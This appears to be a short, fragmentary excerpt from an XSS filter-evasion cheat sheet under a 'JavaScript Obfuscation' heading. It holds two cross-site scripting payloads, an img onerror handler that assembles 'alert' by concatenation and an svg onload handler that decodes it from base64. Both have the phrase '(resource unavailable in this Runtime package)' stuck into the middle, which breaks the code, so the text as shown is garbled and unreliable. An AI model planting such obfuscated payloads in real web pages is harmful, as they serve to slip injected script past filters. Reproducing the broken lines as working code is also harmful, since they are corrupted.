...
- **JavaScript Obfuscation**:
  ...
  <img src=x onerror="window`'al'+'ert'` (resource unavailable in this Runtime package)">
  ```
...
# Try: <svg/onload=self`atob('YWxlcnQ='):` (resource unavailable in this Runtime package)>
